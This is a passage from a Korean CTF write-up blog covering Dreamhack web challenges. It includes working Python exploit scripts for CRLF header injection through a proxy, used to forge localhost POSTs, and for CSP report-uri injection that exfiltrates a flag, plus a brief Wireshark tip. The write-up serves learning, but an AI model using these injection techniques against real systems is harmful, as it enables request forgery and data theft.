+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;_flag.php&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span> <span style="color:#f92672">||</span> $_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;::1&#34;</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#34;mode&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;write&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;dbkey&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;key&#34;</span>])) {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        $k1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#34;dbkey&#34;</span>]);
+</span></span><span style="display:flex;"><span>        $k2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($_POST[<span style="color:#e6db74">&#34;dbkey&#34;</span>]<span style="color:#f92672">.</span>$_POST[<span style="color:#e6db74">&#34;key&#34;</span>]);
+</span></span><span style="display:flex;"><span>        $value <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>($flag);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">@</span><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#34;/tmp/api-portal/db/</span><span style="color:#e6db74">$k1</span><span style="color:#e6db74">/</span><span style="color:#e6db74">$k2</span><span style="color:#e6db74">&#34;</span>, $value);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;success&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>_flag.php_에 localhost에서 post를 하기 위해 _action/net/proxy/post.php_를 살펴보면 header에 <code>REQUEST_URI</code>가 들어가게 되고, CRLF를 추가하여 data와 함께 post 요청을 할 수 있다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://&#34;</span><span style="color:#f92672">.</span>$param[<span style="color:#ae81ff">0</span>]; <span style="color:#75715e">// $_GET[&#34;url&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$ip <span style="color:#f92672">=</span> $param[<span style="color:#ae81ff">1</span>]; <span style="color:#75715e">// $_SERVER[&#34;REMOTE_ADDR&#34;]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$referer <span style="color:#f92672">=</span> $param[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// urldecode($_SERVER[&#34;REQUEST_URI&#34;])
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>$header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;User-Agent: API Portal Proxy</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>$header <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;X-Forwarded-For: </span><span style="color:#e6db74">{</span>$ip<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>$header <span style="color:#f92672">.=</span> <span style="color:#e6db74">&#34;X-Api-Referer: </span><span style="color:#e6db74">{</span>$referer<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>$ctx <span style="color:#f92672">=</span> <span style="color:#a6e22e">stream_context_create</span>(<span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;http&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">array</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#39;method&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;content&#34;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#75715e">//TODO: implement
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#e6db74">&#39;header&#39;</span> <span style="color:#f92672">=&gt;</span> $header
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>));
+</span></span></code></pre></div><h3 id="solution-4">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-4">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> quote
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://host1.dreamhack.games:12293&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;asd&#34;</span>
+</span></span><span style="display:flex;"><span>dbkey <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;asd&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;db/create&#34;</span>, <span style="color:#e6db74">&#34;key&#34;</span>: key})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>content <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mode=write&amp;dbkey=asd&amp;key=asd&#34;</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Content-Type: application/x-www-form-urlencoded</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">+=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Content-Length: </span><span style="color:#e6db74">{</span>len(content)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/?action=net/proxy/post&amp;url=127.0.0.1/?action=flag/flag&amp;&#34;</span> <span style="color:#f92672">+</span> quote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">{</span>header<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n\r\n</span><span style="color:#e6db74">{</span>content<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;db/list&#34;</span>})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, params<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;action&#34;</span>: <span style="color:#e6db74">&#34;db/read&#34;</span>, <span style="color:#e6db74">&#34;dbkey&#34;</span>: dbkey, <span style="color:#e6db74">&#34;key&#34;</span>: key})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><hr>
+<h2 id="r-100-100">R. 100-100<a hidden class="anchor" aria-hidden="true" href="#r-100-100">#</a></h2>
+<h3 id="vulnerability-8">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability-8">#</a></h3>
+<p>_prob.php_는 Content-Securiy-Policy 헤더와 GET parameter로 받은 헤더를 추가한다.
+페이지를 렌더링할 때 <code>{{flag}}</code>는 localhost에서 접근할 때 flag로 대체된다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#34;Content-Security-Policy: default-src &#39;none&#39;; base-uri &#39;none&#39;; navigate-to &#39;none&#39;;&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#34;extreme&#34;</span>])
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">header</span>($_GET[<span style="color:#e6db74">&#34;extreme&#34;</span>], <span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">...</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">simple_template</span>($input) {
+</span></span><span style="display:flex;"><span>	$input <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{{flag}}&#34;</span>, <span style="color:#a6e22e">get_flag</span>(), $input);
+</span></span></code></pre></div><p>Content-Security-Policy에 <code>report-uri</code>옵션을 지정하면, CSP Violation이 발생했을 때 지정한 uri로 내용에 대해 post 요청을 보내준다.</p>
+<p>Content-Security-Policy는 여러 개의 헤더가 있으면, most restricted된 policy를 따른다.</p>
+<p>위 두 속성을 이용하면, CSP에 <code>report-uri</code>를 추가할 수 있고, src에 flag를 추가해 CSP Violation이 발생되면 원하는 uri로 flag를 포함한 post 요청을 보낼 수 있다.</p>
+<h3 id="solution-5">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-5">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://host3.dreamhack.games:17992&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://localhost/prob.php?content=&lt;img src={{flag}}&gt;&amp;extreme=Content-Security-Policy: default-src &#39;none&#39;; report-uri /receiver.php?uid=asd;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>url<span style="color:#e6db74">}</span><span style="color:#e6db74">/submit.php&#34;</span>, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;url&#34;</span>: payload})
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><hr>
+<h2 id="s-sleepingshark">S. sleepingshark<a hidden class="anchor" aria-hidden="true" href="#s-sleepingshark">#</a></h2>
+<p>scapy를 사용하려다 너무 느려서 Wireshark 필터 <code>http and http.time &gt; 2</code>를 사용해 수동으로 찾았다.</p>
+<h2 id="t-survey설문조사">T. Survey/설문조사<a hidden class="anchor" aria-hidden="true" href="#t-survey설문조사">#</a></h2>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://blog.imssm99.kr/tags/ctf/">ctf</a></li>
+      <li><a href="https://blog.imssm99.kr/tags/writeup/">writeup</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://blog.imssm99.kr/ctf/google_ctf_2022/">
+    <span class="title">Next Page »</span>
+    <br>
+    <span>Google Capture The Flag 2022 Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2022 <a href="https://blog.imssm99.kr/">imssm99 Blog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
